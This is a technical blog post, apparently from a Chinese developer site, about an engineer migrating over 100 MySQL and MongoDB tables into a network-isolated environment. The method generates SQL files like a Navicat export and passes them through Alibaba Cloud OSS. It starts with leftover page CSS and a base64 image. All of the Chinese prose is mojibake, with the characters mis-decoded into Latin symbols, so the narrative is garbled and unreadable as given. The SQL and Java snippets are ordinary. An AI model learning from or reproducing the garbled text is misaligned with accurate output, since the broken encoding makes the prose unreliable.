100%;opacity:.36;background-repeat:no-repeat;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAABfVBMVEX///8Ad/8AgP8AgP8AgP8Aff8AgP8Af/8AgP8AVf8Af/8Af/8AgP8AgP8Af/8Afv8AAP8Afv8Afv8Aef8AgP8AdP8Afv8AgP8AgP8Acf8Ae/8AgP8Af/8AgP8Af/8Af/8AfP8Afv8AgP8Af/8Af/8Afv8Afv8AgP8Afv8AgP8Af/8Af/8AgP8AgP8Afv8AgP8Af/8AgP8AgP8AgP8Ae/8Afv8Af/8AgP8Af/8AgP8Af/8Af/8Aff8Af/8Abf8AgP8Af/8AgP8Af/8Af/8Afv8AgP8AgP8Afv8Afv8AgP8Af/8Aff8AgP8Afv8AgP8Aff8AgP8AfP8AgP8Ae/8AgP8Af/8AgP8AgP8AgP8Afv8AgP8AgP8AgP8Afv8AgP8AgP8AgP8AgP8AgP8Af/8AgP8Af/8Af/8Aev8Af/8AgP8Aff8Afv8AgP8AgP8AgP8Af/8AgP8Af/8Af/8AgP8Afv8AgP8AgP8AgP8AgP8Af/8AeP8Af/8Af/8Af//////rzEHnAAAAfXRSTlMAD7CCAivatxIDx5EMrP19AXdLEwgLR+6iCR/M0yLRzyFF7JupSXn8cw6v60Q0QeqzKtgeG237HMne850/6Qeq7QaZ+WdydHtj+OM3qENCMRYl1B3K2U7wnlWE/mhlirjkODa9FN/BF7/iNV/2kASNZpX1Wlf03C4stRGxgUPclqoAAAABYktHRACIBR1IAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH4gEaBzgZ4yeM3AAAAT9JREFUOMvNUldbwkAQvCAqsSBoABE7asSOBRUVVBQNNuy9996789+9cMFAMHnVebmdm+/bmdtbQv4dOFOW2UjPzgFyLfo6nweKfIMOBYWwFtmMPGz2Yj2pJI0JDq3udJW6VVbmKa9I192VQFV1ktXUAl5NB0cd4KpnORqsEO2ZIRpF9gJfE9Dckqq0KuZt7UAH5+8EPF3spjsRpCeQNO/tA/qDwIDA+OCQbBoKA8NOdjMySgcZGVM6jwcgRuUiSs0nlPFNSrEpJfU0jTLD6llqbvKxei7OzvkFNQohi0vAsj81+MoqsCaoPOQFgus/1LyxichW+hS2JWCHZ7VlF9jb187pIAYcHiViHAMnp5mTjJ8B5xeEXF4B1ze/fTh/C0h398DDI9HB07O8ci+vRBdvdGnfP4gBuM8vw7X/G3wDmFhFZEdxzjMAAAAldEVYdGRhdGU6Y3JlYXRlADIwMTgtMDEtMjZUMDc6NTY6MjUrMDE6MDA67pVWAAAAJXRFWHRkYXRlOm1vZGlmeQAyMDE4LTAxLTI2VDA3OjU2OjI1KzAxOjAwS7Mt6gAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAAWdEVYdFRpdGxlAGp1ZWppbl9sb2dvIGNvcHlxapmKAAAAV3pUWHRSYXcgcHJvZmlsZSB0eXBlIGlwdGMAAHic4/IMCHFWKCjKT8vMSeVSAAMjCy5jCxMjE0uTFAMTIESANMNkAyOzVCDL2NTIxMzEHMQHy4BIoEouAOoXEXTyQjWVAAAAAElFTkSuQmCC)}.markdown-body h2{position:relative;font-size:20px;border-left:4px solid;padding:0 0 0 10px;margin:30px 0}.markdown-body h3{font-size:16px}.markdown-body ul{list-style:disc outside;margin-left:2em;margin-top:1em}.markdown-body li{line-height:2;color:#595959}.markdown-body img.loaded{margin:0 auto;display:block}.markdown-body blockquote{background:#fff9f9;margin:2em 0;padding:2px 20px;border-left:4px solid #b2aec5}.markdown-body blockquote p{color:#666;line-height:2}.markdown-body a{color:#036aca;border-bottom:1px solid rgba(3,106,202,.8);font-weight:400;text-decoration:none}.markdown-body em strong,.markdown-body strong{color:#036aca}.markdown-body hr{border-top:1px solid #135ce0}.markdown-body pre{overflow:auto}.markdown-body code,.markdown-body pre{overflow:auto;position:relative;line-height:1.75;font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body table{border-collapse:collapse;margin:1rem 0;overflow-x:auto}.markdown-body table td,.markdown-body table th{border:1px solid #dfe2e5;padding:.6em 1em}.markdown-body table tr{border-top:1px solid #dfe2e5}.markdown-body table tr:nth-child(2n){background-color:#f6f8fa}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p><strong>ä¸ªäººå£°æ˜</strong>ï¼šæœ¬æ–‡æ‰€æœ‰ä»£ç ç¤ºä¾‹å‡å·²è„±æ•å¤„ç†ï¼Œä»…ä¿ç•™æ ¸å¿ƒæŠ€æœ¯é€»è¾‘ï¼Œä¸æ¶‰åŠä»»ä½•æ•æ„Ÿä¸šåŠ¡ä¿¡æ¯ã€‚</p>
</blockquote>
<hr/>
<h2 data-id="heading-0">å‰æƒ…æè¦ï¼šä¸€ä¸ªå ªç§°"ç¤¾æ­»"çš„å·¥æœŸ</h2>
<p>è¿˜è®°å¾—é‚£å¤©ï¼Œè€æ¿æŠŠæˆ‘å«åˆ°åŠå…¬å®¤ï¼Œé€’è¿‡æ¥ä¸€ä»½éœ€æ±‚æ–‡æ¡£ï¼š"ä¸‹ä¸ªæœˆè¦æŠŠé¡¹ç›®è¿ç§»åˆ°æ–°å¹³å°ï¼Œæ•°æ®è¿™å—ä½ æ¥æå®šã€‚"</p>
<p>æˆ‘æ‰“å¼€æ–‡æ¡£ï¼Œæ‰«äº†ä¸€çœ¼ï¼Œå·®ç‚¹å½“åœºçŸ³åŒ–ï¼š</p>
<p><strong>éœ€æ±‚æ¸…å•</strong>ï¼š</p>
<ul>
<li>100+å¼ æ•°æ®è¡¨è¦è¿ç§»ï¼ˆè¿˜è¦æ”¯æŒåç»­åŠ¨æ€æ–°å¢ï¼‰</li>
<li>åŒé“¾è·¯åŒæ­¥ï¼šMySQLåˆ°MySQLã€MongoDBåˆ°PostgreSQL</li>
<li>ä¸èƒ½å†™æ­»é…ç½®ï¼Œè¦èƒ½çµæ´»æ‰©å±•</li>
<li><strong>å·¥æœŸä¸åˆ°1ä¸ªæœˆ</strong></li>
</ul>
<p><strong>æŠ€æœ¯çº¦æŸ</strong>ï¼š</p>
<ul>
<li><strong>æºç¯å¢ƒï¼ˆå¡”å¤–ï¼‰å’Œç›®æ ‡ç¯å¢ƒï¼ˆå¡”å†…ï¼‰ç½‘ç»œå®Œå…¨éš”ç¦»</strong></li>
<li>å¡”å¤–åªèƒ½è¯»æºåº“ï¼Œæ— æ³•è®¿é—®ç›®æ ‡åº“</li>
<li>å¡”å†…åªèƒ½å†™ç›®æ ‡åº“ï¼Œæ— æ³•è®¿é—®æºåº“</li>
<li><strong>ä¸¤ç«¯å”¯ä¸€çš„æ¡¥æ¢ï¼šé˜¿é‡Œäº‘OSSï¼ˆå¡”å¤–åªèƒ½å†™ï¼Œå¡”å†…å¯ä»¥è¯»å†™ï¼‰</strong></li>
<li>å¡”å†…ä¸æ”¯æŒMongoDBï¼Œå¿…é¡»ç”¨PostgreSQLæ›¿ä»£</li>
</ul>
<p><strong>æ•°æ®è§„æ¨¡</strong>ï¼š</p>
<ul>
<li><strong>å•è¡¨æœ€å¤§1000ä¸‡+è¡Œ</strong>æ•°æ®</li>
<li>å•åº—é“ºå•è¡¨50ä¸‡+è¡Œï¼ˆæ¶‰åŠ1000+ä¸ªåº—é“ºï¼‰</li>
<li>æ€»è®¡100+å¼ è¡¨</li>
</ul>
<p>é‚£ä¸€åˆ»ï¼Œæˆ‘è„‘æµ·é‡Œæµ®ç°çš„ç”»é¢æ˜¯ï¼šåœ¨å…¬å¸åœ°ä¸‹å®¤ç–¯ç‹‚å†™MyBatis <code>&lt;select&gt;</code>ã€<code>&lt;insert&gt;</code>è¯­å¥ç›´åˆ°çŒæ­»...</p>
<p>ä½†æœ€ç»ˆï¼Œæˆ‘ä¸ä»…<strong>æå‰5å¤©å®Œæˆè¿ç§»</strong>ï¼Œè¿˜æå‡ºäº†ä¸€å¥—èƒ½<strong>è®©åç»­è¡¨ç§’çº§ä¸Šçº¿</strong>çš„"å…¨è‡ªåŠ¨åŒ–æµæ°´çº¿"ã€‚æ€ä¹ˆåšåˆ°çš„ï¼Ÿ</p>
<blockquote>
<p><strong>ç­”æ¡ˆå°±è—åœ¨Navicatçš„"å¯¼å…¥/å¯¼å‡º"åŠŸèƒ½é‡Œ</strong>â€”â€”ç›´æ¥æ„é€ SQLæ–‡ä»¶ä¸Šä¼ OSSï¼Œå¡”å†…æ‰§è¡Œï¼Œå¤æ‚é€»è¾‘å…¨éƒ½åœ¨å¡”å¤–å¤„ç†ï¼</p>
</blockquote>
<hr/>
<h2 data-id="heading-1">ä¸€çœ¼æœ›å»çš„ä¸ƒå¤§æŠ€æœ¯éš¾ç‚¹</h2>
<p>åœ¨å¼€å§‹åŠ¨æ‰‹å‰ï¼Œæˆ‘å…ˆæ¢³ç†äº†ä¸€ä¸‹é¢ä¸´çš„æŒ‘æˆ˜ï¼š</p>
<p><strong>éš¾ç‚¹1ï¼šè¡¨ç»“æ„åƒå·®ä¸‡åˆ«</strong><br/>
100+å¼ è¡¨ï¼Œæ¯å¼ è¡¨çš„å­—æ®µã€ç±»å‹ã€ä¸»é”®éƒ½ä¸ä¸€æ ·ã€‚ä¼ ç»ŸMyBatisæ–¹å¼æ„å‘³ç€è¦å†™100+ä¸ªMapperã€100+ä¸ªå®ä½“ç±»ã€‚åç»­æ–°å¢è¡¨è¿˜å¾—ç»§ç»­å†™ï¼Œ<strong>ä»£ç å¤ç”¨åº¦â‰ˆ0</strong>ã€‚</p>
<p><strong>éš¾ç‚¹2ï¼šåŒæ­¥ç­–ç•¥å¤šæ ·åŒ–</strong><br/>
100+å¼ è¡¨éœ€è¦æ”¯æŒ<strong>å››ç§åŒæ­¥ç­–ç•¥</strong>ï¼Œæ¡ä»¶å„ä¸ç›¸åŒï¼š</p>
<ul>
<li><strong>å…¨è¡¨åŒæ­¥</strong>ï¼šåŸºç¡€é…ç½®è¡¨ï¼Œæ•°æ®é‡å°ï¼Œ<code>TRUNCATE</code>åä¸€æ¬¡æ€§æ’å…¥å…¨éƒ¨æ•°æ®</li>
<li><strong>å…¬å¸çº§æ¡ä»¶åŒæ­¥</strong>ï¼šæŒ‰<code>company_id</code>ç»´åº¦åŒæ­¥ï¼Œæ”¯æŒæ¡ä»¶è¿‡æ»¤</li>
<li><strong>åº—é“ºçº§å¢é‡åŒæ­¥</strong>ï¼šæœ‰<code>is_deleted</code>å’Œ<code>update_time</code>çš„è¡¨ï¼ŒæŒ‰<code>shop_id</code>+æ—¶é—´æ¡ä»¶å¢é‡åŒæ­¥</li>
<li><strong>åº—é“ºçº§å…¨é‡åŒæ­¥</strong>ï¼šç‰©ç†åˆ é™¤çš„è¡¨ï¼ŒæŒ‰<code>shop_id</code>ç»´åº¦å…¨é‡åŒæ­¥å•åº—é“ºæ•°æ®</li>
</ul>
<p>æ¯å¼ è¡¨çš„ç­–ç•¥å’Œæ¡ä»¶éƒ½ä¸åŒï¼Œéœ€è¦æ”¯æŒ<strong>çµæ´»é…ç½®</strong>ã€‚</p>
<p><strong>éš¾ç‚¹3ï¼šæ•°æ®å†…å®¹åŒ…å«ç‰¹æ®Šå­—ç¬¦</strong><br/>
æŸäº›å­—æ®µçš„å†…å®¹åŒ…å«åˆ†å·ã€å•å¼•å·ç­‰SQLç‰¹æ®Šå­—ç¬¦ï¼Œå¦‚æœä¸å¤„ç†ï¼Œç”Ÿæˆçš„SQLæ–‡ä»¶ä¼šåœ¨æ‰§è¡Œæ—¶è¯­æ³•æŠ¥é”™ã€‚</p>
<p><strong>éš¾ç‚¹4ï¼šè¶…å¤§æ•°æ®é‡</strong><br/>
<strong>å•è¡¨1000ä¸‡+æ•°æ®</strong>ï¼Œä¸€æ¬¡æ€§åŠ è½½åˆ°å†…å­˜<strong>å¿…ç„¶OOM</strong>ã€‚è€Œä¸”ç”Ÿæˆçš„SQLæ–‡ä»¶å¯èƒ½å‡ ç™¾MBï¼Œç½‘ç»œä¼ è¾“å’Œå­˜å‚¨éƒ½æ˜¯é—®é¢˜ã€‚</p>
<p><strong>éš¾ç‚¹5ï¼šMongoDBåˆ°PostgreSQLçš„ç±»å‹é¸¿æ²Ÿ</strong><br/>
MongoDBçš„ObjectIdã€BSONå¯¹è±¡ã€æ•°ç»„ç±»å‹ï¼ŒPostgreSQLéƒ½ä¸æ”¯æŒã€‚éœ€è¦åšå¤æ‚çš„ç±»å‹æ˜ å°„å’Œè½¬æ¢ã€‚</p>
<p><strong>éš¾ç‚¹6ï¼šç½‘ç»œéš”ç¦»æ¶æ„</strong><br/>
å¡”å¤–å’Œå¡”å†…<strong>ç½‘ç»œå®Œå…¨éš”ç¦»</strong>ï¼Œä¼ ç»Ÿçš„ETLå·¥å…·ï¼ˆDataXï¼‰æ ¹æœ¬ç”¨ä¸äº†ã€‚å®ƒä»¬éƒ½æ˜¯"è¯»â†’å¤„ç†â†’å†™"çš„å•æœºæ¨¡å¼ï¼Œéœ€è¦åŒæ—¶è®¿é—®æºåº“å’Œç›®æ ‡åº“ã€‚</p>
<blockquote>
<p><strong>è§£å†³æ–¹æ¡ˆ</strong>ï¼šè‡ªå·±æ­å»ºä¸€ä¸ªç±»ä¼¼navicatçš„å¯¼å…¥/å¯¼å‡ºï¼Œèƒ½åŠ¨æ€æ‰§è¡ŒSQLçš„åŠŸèƒ½ã€‚</p>
</blockquote>
<p><strong>éš¾ç‚¹7ï¼šè¡¨é—´ä¾èµ–å…³ç³»å¯¼è‡´çš„é¡ºåºé—®é¢˜</strong><br/>
éƒ¨åˆ†è¡¨ä¹‹é—´å­˜åœ¨å¤–é”®ä¾èµ–å…³ç³»ï¼ˆå¦‚<code>order_items</code>ä¾èµ–<code>orders</code>ï¼‰ï¼Œå¦‚æœå¹¶å‘åŒæ­¥ï¼š</p>
<ul>
<li><code>order_items</code>å…ˆæ‰§è¡Œæ’å…¥ï¼Œä½†<code>orders</code>è¿˜æœªåŒæ­¥ â†’ <strong>å¤–é”®çº¦æŸå¤±è´¥</strong></li>
<li>éœ€è¦è¯†åˆ«ä¾èµ–å…³ç³»ï¼Œå…ˆåŒæ­¥çˆ¶è¡¨ï¼Œå†åŒæ­¥å­è¡¨ï¼Œä¿è¯æ•°æ®å®Œæ•´æ€§</li>
</ul>
<blockquote>
<p><strong>è§£å†³æ–¹æ¡ˆ</strong>ï¼šå¡”å†…æ‰«æSQLæ–‡ä»¶æ—¶ï¼Œä¼˜å…ˆå¤„ç†çˆ¶è¡¨ï¼Œå†å¹¶å‘å¤„ç†å…¶ä»–è¡¨</p>
</blockquote>
<hr/>
<h2 data-id="heading-2">çµæ„Ÿæ¥æºï¼šNavicatæ˜¯æ€ä¹ˆåšçš„ï¼Ÿ</h2>
<p>æŸå¤©æ·±å¤œï¼Œæˆ‘æ‰“å¼€Navicatå‡†å¤‡æ‰‹åŠ¨å¯¼å‡ºç¬¬ä¸€æ‰¹æµ‹è¯•æ•°æ®ã€‚ç›¯ç€"å¯¼å‡ºå‘å¯¼"å‘å‘†çš„æ—¶å€™ï¼Œçªç„¶è„‘å­é‡Œé—ªè¿‡ä¸€ä¸ªå¿µå¤´ï¼š</p>
<p><strong>Navicatæ˜¯æ€ä¹ˆåšåˆ°å¯¼å‡ºä»»æ„è¡¨çš„ï¼Ÿ</strong></p>
<p>æˆ‘ç‚¹å¼€å¯¼å‡ºçš„.sqlæ–‡ä»¶ï¼š</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- åˆ é™¤æ—§è¡¨</span>
<span class="hljs-keyword">DROP</span> <span class="hljs-keyword">TABLE</span> IF <span class="hljs-keyword">EXISTS</span> `demo_table`;

<span class="hljs-comment">-- é‡å»ºè¡¨ç»“æ„</span>
<span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> `demo_table` (
  `id` <span class="hljs-type">int</span>(<span class="hljs-number">11</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> AUTO_INCREMENT,
  `name` <span class="hljs-type">varchar</span>(<span class="hljs-number">50</span>) <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span>,
  <span class="hljs-keyword">PRIMARY</span> KEY (`id`)
) ENGINE<span class="hljs-operator">=</span>InnoDB;

<span class="hljs-comment">-- æ’å…¥æ•°æ®</span>
<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> `demo_table` <span class="hljs-keyword">VALUES</span> (<span class="hljs-number">1</span>, <span class="hljs-string">'test'</span>);
</code></pre>
<p>è±ç„¶å¼€æœ—ï¼Navicatçš„æ ¸å¿ƒé€»è¾‘å°±æ˜¯ï¼š</p>
<ol>
<li>ç”¨<code>SHOW CREATE TABLE</code>è·å–è¡¨ç»“æ„</li>
<li>ç”¨<code>SELECT *</code>æŸ¥è¯¢æ•°æ®</li>
<li>ç”Ÿæˆæ ‡å‡†SQLæ–‡ä»¶</li>
<li>ç”¨æˆ·æ‰‹åŠ¨åœ¨ç›®æ ‡åº“æ‰§è¡Œ</li>
</ol>
<p><strong>å¦‚æœæˆ‘æŠŠè¿™å¥—é€»è¾‘è‡ªåŠ¨åŒ–å‘¢ï¼Ÿ</strong></p>
<ul>
<li><strong>å¡”å¤–</strong>ï¼šè‡ªåŠ¨æŸ¥è¡¨ç»“æ„ã€è‡ªåŠ¨æŸ¥æ•°æ®ã€è‡ªåŠ¨ç”ŸæˆSQLã€è‡ªåŠ¨ä¸Šä¼ OSS</li>
<li><strong>å¡”å†…</strong>ï¼šè‡ªåŠ¨æ‰«æOSSã€è‡ªåŠ¨è¯»å–SQLæ–‡ä»¶ã€è‡ªåŠ¨æ‰§è¡Œ</li>
</ul>
<p>è¿™ä¸å°±å®Œç¾å¥‘åˆäº†"å¡”å¤–-å¡”å†…"çš„æ¶æ„çº¦æŸå—ï¼</p>
<hr/>
<h2 data-id="heading-3">æ ¸å¿ƒæ–¹æ¡ˆè®¾è®¡</h2>
<h3 data-id="heading-4">æ•´ä½“æ¶æ„æµç¨‹</h3>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/447cb7cc4a534572b957063cb4b65051~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiA5peF5Lq6:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769611152&amp;x-signature=DY7THQLBccrlgfCTckRw10RcmaI%3D" alt="f91cc3bf56d0539d6a6a3560ded4f617.png" loading="lazy"/></p>
<h3 data-id="heading-5">æŠ€æœ¯é€‰å‹è¯´æ˜</h3>
<p><strong>å¡”å¤–ç³»ç»ŸæŠ€æœ¯æ ˆ</strong>ï¼š</p>



































<table><thead><tr><th>ç»„ä»¶</th><th>é€‰å‹</th><th>ä½¿ç”¨åœºæ™¯</th><th>é€‰å‹ç†ç”±</th></tr></thead><tbody><tr><td><strong>æ¶ˆæ¯é˜Ÿåˆ—</strong></td><td>RocketMQ</td><td>è§¦å‘åŒæ­¥ï¼Œå¼‚æ­¥è§£è€¦è¿›è¡ŒSQLæ–‡ä»¶æ„é€ </td><td>æ”¯æŒ<strong>TAGè¿‡æ»¤</strong>(MySQLToMySQL/MongodbToPgSQLï¼‰<br/><strong>é¡ºåºæ¶ˆè´¹</strong>ä¿è¯æ•°æ®ä¸€è‡´æ€§ï¼Œæ”¯æŒ<strong>å¯åç»­æ‰©å±•åŒæ­¥ç±»å‹ä¾‹å¦‚RedisToMySQL</strong></td></tr><tr><td><strong>æµå¼å¤„ç†</strong></td><td>JDBC Stream<br/>MongoTemplate</td><td>è¯»å–è¶…å¤§è¡¨æ•°æ®</td><td><strong>é¿å…OOM</strong>ï¼Œ<code>setFetchSize(Integer.MIN_VALUE)</code>å¯ç”¨MySQLæœåŠ¡å™¨ç«¯æ¸¸æ ‡ï¼ŒMongoä½¿ç”¨æµå¼è¯»å–çš„apiï¼Œ<strong>å†…å­˜å ç”¨æ’å®š</strong></td></tr><tr><td><strong>é…ç½®ç®¡ç†</strong></td><td>MySQLé…ç½®è¡¨</td><td>ç®¡ç†åŒæ­¥è§„åˆ™</td><td><strong>é…ç½®é©±åŠ¨</strong>ï¼Œæ–°å¢è¡¨æ— éœ€æ”¹ä»£ç ï¼Œæ”¯æŒ<strong>å ä½ç¬¦åŠ¨æ€æ›¿æ¢</strong>ï¼ˆ<code>{shopId}</code>/<code>{companyId}</code>ï¼‰</td></tr><tr><td><strong>æ–‡ä»¶ä¸Šä¼ </strong></td><td>é˜¿é‡Œäº‘OSS SDK</td><td>SQLæ–‡ä»¶ä¸Šä¼ </td><td>å”¯ä¸€èƒ½æ‰“é€šå¡”å¤–å¡”å†…çš„æ¡¥æ¢ï¼Œ<strong>å¯ç”¨æ€§99.995%</strong>ï¼Œæ”¯æŒå¤§æ–‡ä»¶</td></tr></tbody></table>
<p><strong>å¡”å†…ç³»ç»ŸæŠ€æœ¯æ ˆ</strong>ï¼š</p>





























<table><thead><tr><th>ç»„ä»¶</th><th>é€‰å‹</th><th>ä½¿ç”¨åœºæ™¯</th><th>é€‰å‹ç†ç”±</th></tr></thead><tbody><tr><td><strong>å¹¶å‘æ§åˆ¶</strong></td><td>CompletableFuture</td><td>å¹¶å‘å¤„ç†å¤šä¸ªSQLæ–‡ä»¶</td><td><strong>JDK8åŸç”Ÿ</strong>ï¼Œæ— éœ€å¼•å…¥ç¬¬ä¸‰æ–¹åº“ï¼Œ<strong>è½»é‡çº§å¼‚æ­¥ç¼–ç¨‹</strong></td></tr><tr><td><strong>æ–‡ä»¶ä¸‹è½½</strong></td><td>é˜¿é‡Œäº‘OSS SDK</td><td>SQLæ–‡ä»¶ä¸‹è½½å’Œåˆ é™¤</td><td>æµå¼ä¸‹è½½ï¼Œæ”¯æŒ<strong>é€è¡Œè¯»å–</strong>ï¼Œæ‰§è¡ŒæˆåŠŸå<strong>ç«‹å³åˆ é™¤</strong>é˜²æ­¢é‡å¤</td></tr><tr><td><strong>æ‰¹é‡æ‰§è¡Œ</strong></td><td>JDBC Batch</td><td>SQLæ‰¹é‡æ‰§è¡Œ</td><td><strong>1000æ¡/æ‰¹</strong>å¹³è¡¡æ€§èƒ½å’Œå†…å­˜ï¼Œ<code>setAutoCommit(true)</code>é˜²æ­¢äº‹åŠ¡è¿‡å¤§</td></tr></tbody></table>
<hr/>
<h2 data-id="heading-6">ç¬¬ä¸€éš¾ï¼š100+å¼ è¡¨ç»“æ„å„å¼‚ï¼Œæ€ä¹ˆåŠ¨æ€ç”ŸæˆSQLï¼Ÿ</h2>
<h3 data-id="heading-7">ä¼ ç»Ÿæ–¹æ¡ˆçš„ç»æœ›ä¹‹è·¯</h3>
<p>å¦‚æœç”¨ä¼ ç»ŸMyBatiså†™æ³•ï¼Œç”»é¢ä¼šæ˜¯è¿™æ ·ï¼š</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!-- è¡¨1çš„Mapper --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"queryTable1"</span>&gt;</span>
    SELECT id, name, create_time FROM table_1 WHERE shop_id = #{shopId}
<span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span>

<span class="hljs-comment">&lt;!-- è¡¨2çš„Mapper --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"queryTable2"</span>&gt;</span>
    SELECT id, title, status FROM table_2 WHERE company_id = #{companyId}
<span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span>

<span class="hljs-comment">&lt;!-- ...é‡å¤100æ¬¡... --&gt;</span>
</code></pre>
<p><strong>æ‰‹å†™100ä¸ªMapperï¼Ÿåˆ«è¯´ä¸€ä¸ªæœˆï¼Œä¸€å¹´éƒ½å†™ä¸å®Œ</strong>ï¼è€Œä¸”åç»­æ–°å¢è¡¨è¿˜å¾—ç»§ç»­å†™ï¼Œ<strong>ä»£ç å¤ç”¨åº¦çº¦ç­‰äº0ã€‚</strong></p>
<h3 data-id="heading-8">çµæ„Ÿæ¥æºï¼šSHOW CREATE TABLE</h3>
<p>MySQLæä¾›äº†ä¸€ä¸ªç¥å™¨ï¼š<code>SHOW CREATE TABLE</code></p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">SHOW</span> <span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> `user_info`;
</code></pre>
<p>è¾“å‡ºï¼š</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> `user_info` (
  `id` <span class="hljs-type">int</span>(<span class="hljs-number">11</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> AUTO_INCREMENT,
  `username` <span class="hljs-type">varchar</span>(<span class="hljs-number">50</span>) <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span>,
  `create_time` datetime <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span>,
  <span class="hljs-keyword">PRIMARY</span> KEY (`id`)
) ENGINE<span class="hljs-operator">=</span>InnoDB;
</code></pre>
<p><strong>æ‹¿åˆ°å»ºè¡¨è¯­å¥ = æ‹¿åˆ°äº†ä¸€åˆ‡è¡¨ä¿¡æ¯</strong>ï¼ˆå­—æ®µåã€ç±»å‹ã€ä¸»é”®...ï¼‰</p>
<h3 data-id="heading-9">æ ¸å¿ƒå®ç°ï¼šåŠ¨æ€è§£æè¡¨ç»“æ„</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> TableStructure <span class="hljs-title function_">getTableStructure</span><span class="hljs-params">(DataSource ds, String tableName)</span> {
    <span class="hljs-type">String</span> <span class="hljs-variable">sql</span> <span class="hljs-operator">=</span> <span class="hljs-string">"SHOW CREATE TABLE `"</span> + tableName + <span class="hljs-string">"`"</span>;
    
    <span class="hljs-keyword">try</span> (<span class="hljs-type">Connection</span> <span class="hljs-variable">conn</span> <span class="hljs-operator">=</span> ds.getConnection();
         <span class="hljs-type">Statement</span> <span class="hljs-variable">stmt</span> <span class="hljs-operator">=</span> conn.createStatement();
         <span class="hljs-type">ResultSet</span> <span class="hljs-variable">rs</span> <span class="hljs-operator">=</span> stmt.executeQuery(sql)) {
        
        <span class="hljs-keyword">if</span> (rs.next()) {
            <span class="hljs-type">String</span> <span class="hljs-variable">ddl</span> <span class="hljs-operator">=</span> rs.getString(<span class="hljs-number">2</span>);  <span class="hljs-comment">// ç¬¬2åˆ—æ˜¯DDLè¯­å¥</span>
            
            <span class="hljs-comment">// æ ¸å¿ƒï¼šæ­£åˆ™è§£æDDLè¯­å¥</span>
            List&lt;String&gt; columns = parseColumns(ddl);      <span class="hljs-comment">// æå–å­—æ®µå</span>
            <span class="hljs-type">String</span> <span class="hljs-variable">primaryKey</span> <span class="hljs-operator">=</span> parsePrimaryKey(ddl);      <span class="hljs-comment">// æå–ä¸»é”®</span>
            
            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TableStructure</span>(columns, primaryKey);
        }
    }
    <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
}
</code></pre>
<p><strong>å…³é”®äº®ç‚¹</strong>ï¼š</p>
<ol>
<li><strong>è¡¨åè½¬ä¹‰</strong>ï¼šé˜²æ­¢å…³é”®å­—å†²çªï¼ˆå¦‚è¡¨åå«<code>order</code>ã€<code>user</code>ï¼‰</li>
<li><strong>æ­£åˆ™è§£æDDL</strong>ï¼šä¸€æ¬¡æ€§è·å–å­—æ®µã€ä¸»é”®ã€ç±»å‹ä¿¡æ¯</li>
<li><strong>é›¶ç¡¬ç¼–ç </strong>ï¼šä»»ä½•è¡¨éƒ½èƒ½è‡ªåŠ¨å¤„ç†ï¼Œåç»­æ–°å¢è¡¨åªéœ€åŠ é…ç½®</li>
</ol>
<blockquote>
<p>ä½ é—®æ€ä¹ˆçŸ¥é“å“ªå¼ è¡¨è¦åŒæ­¥ï¼Ÿè¡¨åä»å“ªæ¥ï¼Ÿè¯·ç»§ç»­å¾€ä¸‹çœ‹...ï¼ˆç¬¬ä¸‰éš¾ä¸­æœ‰è§£å†³æ–¹æ¡ˆï¼Œé€šè¿‡é…ç½®è¡¨å®ç°ï¼‰</p>
